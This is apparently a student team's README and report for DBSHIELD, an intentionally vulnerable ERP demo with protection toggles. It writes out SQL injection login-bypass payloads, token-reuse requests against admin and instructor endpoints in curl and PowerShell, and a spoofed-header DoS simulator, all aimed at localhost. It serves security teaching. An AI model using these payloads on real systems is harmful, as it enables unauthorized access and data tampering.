# DBSHIELD Project Report

## Quick Start

### Install Dependencies

```bash
pip install -r requirements.txt
```

### 1. Load the backend

Start the FastAPI server:

```bash
cd backend
uvicorn app:app --reload --host 0.0.0.0 --port 8000
```

The backend will run at `http://localhost:8000`.

### 2. Open the frontend

Install the frontend dependencies: (from the project root)

```bash
cd frontend/frontend
npm install
```

Start the React frontend:

```bash
npm start
```

Open `http://localhost:3000` in your browser.

### 3. Seed the SQLite database

From the project root, run:

```bash
python3 database/seed_data.py --rows 20000
```

This creates or resets the SQLite database file at `database/dbshield.sqlite3`.

To see the contents of the database (Run these in the root directory):

```bash
sqlite3 database/dbshield.sqlite3

.tables
.schema users
select * from users limit 10;
select * from students limit 10;
```

Default sample logins after seeding:

- `admin / admin123`
- `instructor1 / inst123`
- `instructor2 / inst456`
- `student1 / pass1`
- `student2 / pass2`

Generated student accounts follow the same pattern: `studentN / passN`.

## SQL Injection Demonstration Setup

### 1. Configure the backend for the SQLi demo and start the server

Open `backend/app.py` and use these toggles:

- `ENABLE_SQLI_PROTECTION = False` for the unshielded run
- `ENABLE_SQLI_PROTECTION = True` for the shielded run

For a clean SQLi demo, keep the other protections disabled:

- `ENABLE_DDOS_PROTECTION = False`
- `ENABLE_AUTH_BYPASS_PROTECTION = False`

Restart the backend server after making these changes.

### 2. Reproduce the vulnerable login bypass with curl

This project's intentionally vulnerable login endpoint is `POST /api/login`.
The easiest beginner-friendly payload from the test suite is:

- `username = ' OR '1'='1`
- `password = ' OR '1'='1`

Run this command:

```bash
curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq .
```

With `ENABLE_SQLI_PROTECTION = False`, this should return a successful login response with a token.
That token is effectively admin access in the vulnerable path because the injected query can match the first user row, which is typically the seeded `admin` account.

### 3. Verify which account you received

After the login bypass, inspect the JSON response.
You should see fields similar to:

- `"message": "Login successful."`
- `"role": "admin"`
- `"username": "admin"`
- `"token": "..."`

If you want to store the token and use it immediately:

```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq -r '.token')
```

### 4. Use the token on an admin-only endpoint

```bash
curl -s -X POST http://localhost:8000/api/admin/action \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT username, role FROM users LIMIT 5"}' | jq .
```

With `ENABLE_SQLI_PROTECTION = False`, this demonstrates the impact clearly:

- the SQLi payload logs you in without knowing any real password
- the response usually identifies you as `admin`
- the returned token can then be used on admin-only routes

### 5. Try the protected version

Restart the backend after changing:

- `ENABLE_SQLI_PROTECTION = True`

Run the exact same payload again:

```bash
curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" | jq .
```

With protection enabled, the request should fail instead of returning a token.
Depending on the exact payload and username, you should see either a normal login failure or a message such as `Potential SQL injection detected in password.`

### 6. Other beginner-friendly payloads that work in the vulnerable mode

These are already documented in the SQLi test file and can be tried one by one against `/api/login` when `ENABLE_SQLI_PROTECTION = False`:

- Username: `admin' --`
  Password: `anything`
- Username: `' UNION SELECT 1,'pwned','pwned@example.com','x','admin','Injected Admin','9999999999' --`
  Password: `anything`
- Username: `admin' AND LENGTH(password)=8 --`
  Password: `anything`

The most reliable and easiest one for demonstration is still:

- Username: `' OR '1'='1`
- Password: `' OR '1'='1`

## DOS Attack Demonstration Setup

### 1. Configure the backend for the DoS demo and start the server

Open `backend/app.py` and use these toggles:

- `ENABLE_DDOS_PROTECTION = False` for the unshielded run
- `ENABLE_DDOS_PROTECTION = True` for the shielded run

For this demo, keep SQLi protection disabled so that `/api/login` uses the intentionally slow `handle_student_login()` path.

- `ENABLE_SQLI_PROTECTION = False`

Restart the backend server after making these changes.

Open `http://localhost:3000` in your browser.

### 2. Start the DDoS simulator

```bash
cd ddos_attack
python3 ddos_simulator.py
```

The simulator targets `http://127.0.0.1:8000/api/login` and repeatedly sends randomized login attempts with spoofed `X-Forwarded-For` headers.

### 3. Observe the unshielded behavior

With `ENABLE_DDOS_PROTECTION = False`:

- the attacker requests are processed by the delayed login handler
- the simulator output will mainly show `401` responses, since invalid credentials still reach the login path
- the frontend login experience becomes noticeably slower while the flood is running

This demonstrates that attacker traffic is consuming backend work even though the attacker is not successfully logging in.

### 4. Observe the shielded behavior

Restart the backend after changing:

- `ENABLE_DDOS_PROTECTION = True`

Run the same simulator again.

With protection enabled:

- spoofed requests are rejected in middleware before the expensive login code runs
- the simulator output should mainly show `403` responses in the current local setup
- normal browser requests should remain much smoother than in the unshielded run

This demonstrates that the protection works by blocking spoofed flood traffic early enough to preserve availability for legitimate users.

## Testing Authorization Bypass

### Linux / Bash

Set `ENABLE_AUTH_BYPASS_PROTECTION = False` in `backend/app.py` to demonstrate the vulnerable authorization-bypass behavior.
Set it back to `True` to verify that the same requests are blocked by server-side checks.

The flow below uses a valid student login, then reuses that student token against instructor-only and admin-only endpoints.

#### 1. Login and store the token
```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"pass1"}' | jq -r '.token')
```

#### 2. Admin action without token
```bash
curl -s -X POST http://localhost:8000/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT username FROM users LIMIT 1"}' | jq .
```

#### 3. Admin action with token
```bash
curl -s -X POST http://localhost:8000/api/admin/action \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT username FROM users LIMIT 1"}' | jq .
```

#### 4. Unauthorized grade viewing of another student
```bash
curl -X POST http://localhost:8000/api/student/view-grades \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2"}' | jq .
```

#### 5. Student token used on instructor-only admit endpoint
```bash
curl -s -X POST http://localhost:8000/api/instructor/admit-student \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2","course_code":"CS101"}' | jq .
```

#### 6. Student token used on instructor-only grade assignment
```bash
curl -s -X POST http://localhost:8000/api/instructor/assign-grade \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"student_username":"student2","course_code":"CS101","grade":"F"}' | jq .
```

#### 7. Student token used on instructor-only assignment creation
```bash
curl -s -X POST http://localhost:8000/api/instructor/create-assignment \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"course_code":"CS101","title":"Unauthorized Assignment"}' | jq .
```

#### 8. Student token used on admin-only add-student endpoint
```bash
curl -s -X POST http://localhost:8000/api/admin/add-student \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"bypassdemo","name":"Bypass Demo","email":"bypassdemo@example.com"}' | jq .
```

With `ENABLE_AUTH_BYPASS_PROTECTION = False`, these attack requests should return HTTP 200 and execute even though the token belongs to `student1`.
With `ENABLE_AUTH_BYPASS_PROTECTION = True`, the same requests should fail with HTTP 403 and an `Access denied` message.

### Windows (PowerShell) Equivalents

Use the same toggle setting as above. These commands are written for Windows PowerShell:

#### 1. Login and store token
```powershell
$TOKEN = (Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/login" `
  -ContentType "application/json" `
  -Body '{"username":"student1","password":"pass1"}').token
```

#### 2. Admin Action without token
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/admin/action" `
  -ContentType "application/json" `
  -Body '{"query":"SELECT username FROM users LIMIT 1"}' |
  ConvertTo-Json -Depth 10
```

#### 3. Admin Action with token
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/admin/action" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"query":"SELECT username FROM users LIMIT 1"}' |
  ConvertTo-Json -Depth 10
```

#### 4. Unauthorized grade viewing of another student
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/student/view-grades" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"student_username":"student2"}' |
  ConvertTo-Json -Depth 10
```

#### 5. Student token used on instructor-only admit endpoint
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/instructor/admit-student" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"student_username":"student2","course_code":"CS101"}' |
  ConvertTo-Json -Depth 10
```

#### 6. Student token used on instructor-only grade assignment
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/instructor/assign-grade" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"student_username":"student2","course_code":"CS101","grade":"F"}' |
  ConvertTo-Json -Depth 10
```

#### 7. Student token used on instructor-only assignment creation
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/instructor/create-assignment" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"course_code":"CS101","title":"Unauthorized Assignment"}' |
  ConvertTo-Json -Depth 10
```

#### 8. Student token used on admin-only add-student endpoint
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/api/admin/add-student" `
  -Headers @{ Authorization = "Bearer $TOKEN" } `
  -ContentType "application/json" `
  -Body '{"username":"bypassdemo","name":"Bypass Demo","email":"bypassdemo@example.com"}' |
  ConvertTo-Json -Depth 10
```

In PowerShell, the expected behavior is the same:
- with `ENABLE_AUTH_BYPASS_PROTECTION = False`, these requests should succeed with HTTP 200
- with `ENABLE_AUTH_BYPASS_PROTECTION = True`, they should fail with HTTP 403 and an authorization error



## 1. Group Details

**Team GBDB**

1. **Krishna Prabu** — 23CS30028  
2. **Ketan Suman** — 23CS30027  
3. **Rahul Chandrakant Patne** — 23CS10084  
4. **Arnav Priyadarshi** — 23CS30008  
5. **Shreeraj Kalbande** — 23CS30025  

---

## 2. Project Title

**DBSHIELD — DataBase Systems Handling for Injection, Exploitation, Leakage, and DoS**

---

## 3. Abstract

Modern web applications rely heavily on backend databases to store and process sensitive information such as personal records, financial data, and academic information. However, improper handling of database queries and insufficient system safeguards can expose applications to attacks that compromise confidentiality, integrity, and availability. Among the most common and impactful threats are SQL injection attacks, database-backed denial-of-service (DoS) attacks, timing-based side-channel attacks, and authorization bypass, which exploit weaknesses in query construction, resource management, and observable system behavior.

These vulnerabilities remain highly relevant today because many real-world systems continue to rely on dynamic query construction, shared database infrastructure, and complex access control mechanisms. Attackers do not necessarily need advanced capabilities; even a normal user interacting through a browser can manipulate requests or repeatedly trigger expensive operations to degrade service or infer sensitive information.

In this project, we develop a realistic demonstration environment based on a student ERP portal, consisting of a frontend client, backend application server, and relational database. The system models typical university workflows involving students, professors, and administrators, providing features such as login, grade viewing, course management, and administrative reports.

Using this environment, we engineer and demonstrate four classes of attacks:

1. **SQL Injection Attacks**, where malicious query fragments are inserted into client inputs to extract or manipulate unauthorized data.
2. **Database-backed Denial-of-Service (DoS) Attacks**, where crafted requests trigger expensive database operations that significantly degrade system performance for other users.
3. **Timing Side-Channel Attacks**, where carefully structured query sequences exploit differences in response time to infer protected information that the application does not explicitly reveal.
4. **Authorization Bypass Attacks**, where vulnerabilities in access control mechanisms or session logic are exploited to escalate privileges and perform unauthorized operations on restricted database objects.

After demonstrating these vulnerabilities, we redesign the system using a defense-in-depth framework based on three principles: **prevention, containment, and recovery**.

- **Prevention** focuses on eliminating vulnerabilities through secure query construction, strict database access control, and safer schema and query design.
- **Containment** introduces safeguards such as rate limiting, query cost limits, and execution timeouts to prevent attacks from degrading the entire system.
- **Recovery** mechanisms detect abnormal behavior and restore service quickly by terminating malicious workloads and restoring normal system performance.

We evaluate the effectiveness of these defenses through measurable metrics including attack success rate, data exposure, system latency under attack, throughput degradation, and time to recovery. By comparing the system before and after security improvements, the project demonstrates how practical architectural changes can significantly improve the resilience of database-backed web applications.

---

## 4. Weekly Work Plan

### Team Responsibilities

- **Krishna Prabu** — In charge of maintaining the student ERP frontend and backend.
- **Ketan Suman** — In charge of SQL injection and timing attack implementation and analysis.
- **Rahul Chandrakant Patne** — In charge of SQL injection and timing attack implementation and analysis.
- **Shreeraj Kalbande** — In charge of DoS attack implementation and analysis.
- **Arnav Priyadarshi** — In charge of authorization bypass attack implementation and analysis.

### Week 1

1. Finish the dummy ERP frontend and backend. The system must initially remain vulnerable for demonstration purposes.
2. Research the four security issues, with each team member focusing on one assigned area.

### Week 2

1. Integrate the attack scripts with the frontend-backend example.
2. Design and develop the attack logic for each of the four attack categories.

### Week 3

1. Integrate prevention, containment, and recovery mechanisms into the frontend-backend system.
2. Design and implement scripts or mechanisms that demonstrate prevention, containment, and recovery for each attack scenario.

### Week 4

1. Fully integrate the frontend, backend, and database, and ensure correct end-to-end functionality.
2. Compute and record project metrics such as attack success rate, latency degradation, throughput impact, and recovery time.

### Week 5

1. Write the final project report.
2. Consolidate results, screenshots, attack demonstrations, mitigation analysis, and conclusions.
